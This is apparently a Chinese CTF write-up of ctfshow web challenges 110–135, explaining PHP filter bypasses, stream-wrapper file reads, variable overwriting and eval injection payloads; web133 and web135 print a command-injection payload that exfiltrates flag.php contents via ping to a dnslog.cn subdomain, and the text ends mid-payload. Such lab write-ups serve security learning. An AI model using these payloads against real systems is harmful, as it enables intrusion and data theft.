src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220155405748.png" alt="image-20221220155405748"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220162752867.png" alt="image-20221220162752867"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">加号的含义就是有一个是字母就行</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这道题学到了很多东西，就是利用exception::__toString   这个内置函数</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220162429252.png" alt="image-20221220162429252"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个函数就是echo new Exception(&#x27;aaaa&#x27;)  ---&gt;会直接输出aaaa的报错信息  那么就可以利用这个来进行rce了</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">还有一种就是 $a=&#x27;phpinfo&#x27;;$a();   这种就会直接输出phpinfo()的界面</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220163200636.png" alt="image-20221220163200636"></p><p>然后直接访问fl36dg.txt，就可以直接拿到flag。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220163250189.png" alt="image-20221220163250189"></p><h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220165208448.png" alt="image-20221220165208448"></p><p>这道题因为好多东西都被🈲了，那么只能用字母了，那么system(ls)肯定行不通了，那么我们就得去寻找其他可以用来查看目录的方法了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//filesystemiterator  是一个内置类，用来遍历文件  //继承类</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//directoryItrerator  是一个内置类，用来遍历目录  //父类</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这种类型的题都是利用toString方法  echo new xxxxxxxx;</span><br></pre></td></tr></table></figure><p><strong>写法一</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">directoryItrerator(diename(__FILE__))</span><br></pre></td></tr></table></figure><p><strong>写法二</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">directoryItrerator(&#x27;.&#x27;)   .  ----&gt;是指当前目录</span><br></pre></td></tr></table></figure><p><strong>写法三</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">directoryItrerator(/var/www/html)</span><br></pre></td></tr></table></figure><p><strong>写法四</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">directoryItrerator(getcwd())   getcwd()  ----&gt; 取得当前工作目录</span><br></pre></td></tr></table></figure><p><strong>写法五</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filesystemiterator(getcwd())   ---&gt;只会返回当前文件目录的第一个文件</span><br></pre></td></tr></table></figure><p><strong>写法六</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filesystemiterator  也可以利用   directoryItrerator上面的写法，方法是一样的</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220170850889.png" alt="image-20221220170850889"></p><p>这里的文件名排序是按照文件首字母来排序的，因为f排在前面，所以先输出flag。</p><p>然后访问fl36dga.txt就能拿到flag了。</p><h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220171126721.png" alt="image-20221220171126721"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这道题考察的点是值覆盖，因为v1只需要包含ctfshow就行，那么想要拿到flag，就得用v2给v1覆盖掉，因为函数体内访问的值，只能访问传进来的，因为进行值覆盖了，所以访问不到，那么就得使用全局变量来进行访问了。</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220211211535.png" alt="image-20221220211211535"></p><p>利用的是GLOBALS,全局变量。</p><h2 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h2><p>源码</p><p><strong><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220211312978.png" alt="image-20221220211312978"></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这道题通过过滤的东西，和is_file()这个函数，就能判断出这是需要php伪协议做的</span><br><span class="line">is_file()   这个可以不影响file_get_contents   highlight_file</span><br></pre></td></tr></table></figure><p>is_file()  </p><p><strong><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220212932303.png" alt="image-20221220212932303"></strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220213031242.png" alt="image-20221220213031242"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为php://filter/resource=flag.php  不是一个文件名，所以会返回false，绕过第一层的if判断，然后通过php伪协议传的flag.php就可以成功输出了。  这个伪协议是把过滤器给去掉后的样子</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220213352149.png" alt="image-20221220213352149"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不去掉利用别的过滤器也行，这是官方的wp</span><br></pre></td></tr></table></figure><h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220213618137.png" alt="image-20221220213618137"></p><p>这道题把php://filter协议给过滤掉了。那我们可以尝试下zlip协议</p><p><a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a>   这篇文章把好几种可以用到的协议都总结到一起了</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220214343035.png" alt="image-20221220214343035"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这就是zlip协议的用法。</span><br></pre></td></tr></table></figure><p>下面是官方的解法</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220214452423.png" alt="image-20221220214452423"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p</span><br><span class="line">roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro</span><br><span class="line">c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/</span><br><span class="line">self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se</span><br><span class="line">lf/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是用了目录溢出的方法，可以记记，当作一个积累</span><br></pre></td></tr></table></figure><h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220214604506.png" alt="image-20221220214604506"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">还有一种伪协议是glob://flag.php    但是这题用不了，因为就是这个返回的是一个数组，highlight_file不能高亮一个数组，所以可以当个积累。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">仔细瞧瞧，发现这里没过滤filter,那么就可以用老办法来试一下了。</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220215659735.png" alt="image-20221220215659735"></p><h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220215805366.png" alt="image-20221220215805366"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220221842229.png" alt="image-20221220221842229"></p><p>这个是trim()函数会删掉的东西，不过我们也可以把这个当作一个知识点，就是以后碰到这种需要判断数字的时候，可以利用这些字符来绕过。当然，看到这里，发现缺了个<code>0x0C</code>,刚好可以利用来绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本地试了一下发现%0c36可以绕过is_numeric</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$num!==&#x27;36&#x27;  这个是个强等于，因为%0c36不是字符串，所以也可以绕过</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trim($num)!==&#x27;36&#x27;  因为trim()不会把%0c给去掉，那么也可以进行绕过</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter($num)==&#x27;36&#x27;   这个函数里面也没有把%0c过滤的东西，也可以成功返回36</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有疑问的是这个$num==&#x27;36&#x27;  和  $num!==&#x27;36&#x27;  这就涉及到了一个强等于和弱类型比较的问题了，==表示的是值相等就行，===表示的是值和类型都必须相等。</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220222611713.png" alt="image-20221220222611713"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220222727063.png" alt="image-20221220222727063"></p><h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220222813626.png" alt="image-20221220222813626"></p><p>这里有个命名的规则就是吗，php中变量名只能由数字字母和下划线组成，如果变量名不是这样的话，就会被强制转化，但php只会转换一次，那么就可以利用这一特点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果变量名中有 空格 + [  则会被转化成  _</span><br></pre></td></tr></table></figure><p><strong>implode</strong>    —-&gt;就是将数组以字符串的形式进行输出</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215115138.png" alt="image-20221221215115138"></p><p><strong>get_defined_vars</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215244737.png" alt="image-20221221215244737"></p><p>这道题可以使用这两个东西来解。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215529027.png" alt="image-20221221215529027"></p><p>试了一下，发现<code>echo</code>可以用  那么可以尝试直接<code>echo $flag</code>.</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215640332.png" alt="image-20221221215640332"></p><p>拿到flag，或者也可以上面的两种函数的结合方法。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215751225.png" alt="image-20221221215751225"></p><p>也可以直接拿到flag.</p><h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215903203.png" alt="image-20221221215903203"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这次要使用POST的方法提交数据，extract($_POST)会将POST的数据中的键名和键值转换为相应的变量名和变量值</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract($_GET)  和post一样</span><br></pre></td></tr></table></figure><p>那么传fl0g就可以直接用<strong>post</strong>传了</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221222623391.png" alt="image-20221221222623391"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_export()还是可以替代var_dump来用</span><br></pre></td></tr></table></figure><p><strong>解法二</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221222913484.png" alt="image-20221221222913484"></p><p>show_source();   一样的效果</p><h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221223023719.png" alt="image-20221221223023719"></p><p>这题开始判断长度了</p><p><strong>parse_str</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222164714051.png" alt="image-20221222164714051"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222164510131.png" alt="image-20221222164510131"></p><p>那么我们就可以知道parse_str是干什么的了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">就是将一串字符串来解析成数组的形式并存储在设定的数组里，而+会起到分割作用，如果不分割的话，可能会像上图一样变成只有一个下标为0的一个数组，如果有加号分割的话，就会变成有下标分别为0和1的数组，那么现在就已经把这个函数的运用全部讲完了。</span><br></pre></td></tr></table></figure><p><strong>回到题目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。</span><br><span class="line">不同的参数保存不同的信息，比如，</span><br><span class="line">$_SERVER[&#x27;argv&#x27;] //传递给该脚本的参数。</span><br><span class="line">$_SERVER[&#x27;argc&#x27;] //传递给程序的命令行参数的个数。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=$_SERVER[&#x27;argv&#x27;];   是个空数组</span><br></pre></td></tr></table></figure><p>那么我们就可以利用parse_str往数组里面传值。</p><p><strong>解法一</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET:?a=1+fl0g=flag_give_me</span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</span><br><span class="line">//这下数组a里面就会有key值分别为0和1的值  下标为0对应着a=1，下标为1对应这fl0g=flag_give_me 那么就可以解决问题了。(这是没有parse_str的时候，parse_str的话，key就分别变为a和fl0g)</span><br></pre></td></tr></table></figure><p><strong>解法二</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">url/?$fl0g=flag_give_me;</span><br><span class="line">CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=eval($a[0])</span><br><span class="line"></span><br><span class="line">$c=&quot;eval($a[0])&quot;</span><br><span class="line">$a[0]=&quot;$fl0g=flag_give_me;&quot;</span><br><span class="line">$c=&quot;eval($fl0g=flag_give_me;)&quot;</span><br><span class="line">eval($c;)</span><br><span class="line">eval(eval($fl0g=flag_give_me;);)</span><br><span class="line">// 把eval换成assert也行   assert(xxx)  如果xxx是字符串的话，会把它当作php代码来执行  和上面的一样</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert和eval与parse_str不同的是，eval要加上$符号</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222171040081.png" alt="image-20221222171040081"></p><p>往数组a传值的话，都会先传到下标0下面</p><p><strong>非预期解</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get: ?0=var_export($GLOBALS);</span><br><span class="line">post: CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($_REQUEST[0])</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222171455203.png" alt="image-20221222171455203"></p><p>这样写也行，与parse_str不同的是有无$.</p><h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222171621023.png" alt="image-20221222171621023"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222172706658.png" alt="image-20221222172706658"></p><p><a href="https://www.cnblogs.com/luomir/p/5129875.html">https://www.cnblogs.com/luomir/p/5129875.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过这个图片和这个博客，知道了$url = $_SERVER[&#x27;QUERY_STRING&#x27;];的作用</span><br></pre></td></tr></table></figure><p>那么就可以进行判断了，那么就是得$url会等于问号后面的内容，那么我们就可以让$url=ctf<em>show=ilove36d，然后就可以得到flag，但是</em>被过滤了，我们就可以通过非法命名来获得__,</p><p>那么[ + .被过滤了，我们就可以使用空格来代替，那么就可以成功输出flag.</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222173109121.png" alt="image-20221222173109121"></p><h2 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222173902226.png" alt="image-20221222173902226"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">小知识点： _()是一个函数</span><br><span class="line"></span><br><span class="line">_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll</span><br><span class="line"></span><br><span class="line">get_defined_vars()函数</span><br><span class="line"></span><br><span class="line">get_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag</span><br></pre></td></tr></table></figure><p>本地测试过了，<code>call_user_func</code>（）里面有不是函数的东西，也可以var_dump()输出。那么就只需要管最里面的一层<code>`call_user_func</code>（)`了</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222185459392.png" alt="image-20221222185459392"></p><h2 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222190711929.png" alt=""></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222190719988.png" alt="image-20221222190719988"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">默认目录/var/www/html  就是先返回上一层目录（html)，然后访问一个不存在的目录，然后接着访问上层目录(www)，然后就访问www目录下的html,然后在访问html目录下的flag.php就可以拿到flag了。</span><br></pre></td></tr></table></figure><h2 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222191026405.png" alt="image-20221222191026405"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222192132660.png" alt="image-20221222192132660"></p><p>直接输入就拿到flag了。</p><p><a href="https://bbs.csdn.net/topics/320227966">https://bbs.csdn.net/topics/320227966</a>    关于正则的这篇文章全部概括了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.   是匹配任意字符</span><br><span class="line">+   是匹配出现的次数</span><br><span class="line">?   是任意字符</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一个if的意思是ctfshow的前面如果有字符的话，就会被匹配到</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第二个if的意思是因为stripos返回的是这个字符串第一次出现的位置，返回的是int型，而FALSE是bool型，这里又是强等于，肯定不相等。</span><br></pre></td></tr></table></figure><h2 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222193417083.png" alt="image-20221222193417083"></p><p>这里有个小漏洞，就是正则匹配的话，字符长度超过100w的话就不会在继续匹配了。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222193744465.png" alt="image-20221222193744465"></p><p>进行100w次打印，然后加上36Dctfshow</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222193825464.png" alt="image-20221222193825464"></p><h2 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222194056040.png" alt="image-20221222194056040"></p><p>是一个小网站</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222194137043.png" alt="image-20221222194137043"></p><p>访问robots.txt得到可以访问/admin的信息</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222194619883.png" alt="image-20221222194619883"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里就是考察优先级关系，依次从高到低  非与或 ！&amp; |</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后第二个就是先进行与判断为false,然后false与$username进行或运算的到true，然后在令code等于admin，就可以拿到flag了。</span><br></pre></td></tr></table></figure><h2 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222195142976.png" alt="image-20221222195142976"></p><p>这道题学习的点还是很多的。</p><p><strong>解法一</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222224838401.png" alt="image-20221222224838401"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过传入?F=&#x27;$F &#x27;;touch 1,传入之后访问1，没有返回，所以当前目录不可写</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222224847076.png" alt="image-20221222224847076"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?F=`$F`;+ping `cat flag.php | grep ctfshow | tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.wxtcke.dnslog.cn -c 1   </span><br><span class="line">//.wxtcke.dnslog.cn   是自己去danslog上获取的二级域名</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">``这个函数的作用是执行php代码，``是shell_exec()函数的缩写，然后就去命令执行。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里的意思是会截取`$F`;+这六个字符，但是$F的值并没有变，那么就会截取到eval(`$F`;+)里面，变成eval(``$F`;+ping `cat flag.php | grep ctfshow | tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.wxtcke.dnslog.cn -c 1`;+)   由于前面的`$F`;+，无法识别，就会绕过，去执行后面可以执行的代码。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl不带有任何参数时，curl 就是发出 GET 请求。</span><br><span class="line">grep指令用于查找内容包含指定的范本样式的文件</span><br><span class="line">这里可以使用dns外带把flag带出来</span><br><span class="line">由于flag.php中内容太多了 需要进行格式化 使用linux的 tr -cd</span><br><span class="line">因为flag是数字加字母的字符串，所以可以用tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;</span><br><span class="line">uuid 格式8-4-4-4-12   就是每隔n个字符之间都会有一个-</span><br></pre></td></tr></table></figure><p><a href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html">http://www.ruanyifeng.com/blog/2019/09/curl-reference.html</a>  curl命令讲解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-c, --complement：反选设定字符。也就是符合 SET1 的部份不做处理，不符合的剩余部份才进行转换(payload&quot;&quot;里的东西就是符合的，所以不进行转换或者清除)</span><br><span class="line">-d, --delete：删除指令字符</span><br><span class="line">-s, --squeeze-repeats：缩减连续重复的字符成指定的单个字符</span><br><span class="line">-t, --truncate-set1：削减 SET1 指定范围，使之与 SET2 设定长度相等</span><br><span class="line">--help：显示程序用法信息</span><br></pre></td></tr></table></figure><p><strong>解法二</strong></p><p><a href="https://blog.csdn.net/qq_46091464/article/details/109095382">https://blog.csdn.net/qq_46091464/article/details/109095382</a>  这是出题人自己写的wp，可以去看看，因为我的bp不是专业版，用不了那个功能，所以就演示不了了。</p><p>总结一下  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无回显我们可以用反弹shell 或者curl外带 或者盲注 这里的话反弹没有成功，但是可以外带。</span><br></pre></td></tr></table></figure><h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222231203109.png" alt="image-20221222231203109"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222233123188.png" alt="image-20221222233123188"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222233130740.png" alt="image-20221222233130740"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);</span><br><span class="line">extract($_POST);</span><br><span class="line">这两行代码的讲解，上面的题有过解释，这里就不多说了</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload为什么可以这样写呢，首先就是$_SERVER[&#x27;QUERY_STRING&#x27;]会以url/?=xxx  问号后的那内容用&quot;xx&quot;，存储下来，然后又被parse_str()这个函数分割成数组的形式存储下来，就是key=key1,value=36d</span><br><span class="line">key=key2  value=36d</span><br><span class="line">extract($_POST);  这个是变量覆盖，其他的函数必须以post的形式进行输入，那么由于$_SERVER[&#x27;QUERY_STRING&#x27;]只能在get上输入，所以就得在get上这样写了  _POST[key1]=36d&amp;_POST[key2]=36d  以这种形式替代post输入</span><br></pre></td></tr></table></figure><h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222234906905.png" alt="image-20221222234906905"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?F=`$F`; ping `nl flag.php|awk &#x27;NR==15&#x27;|tr -cd 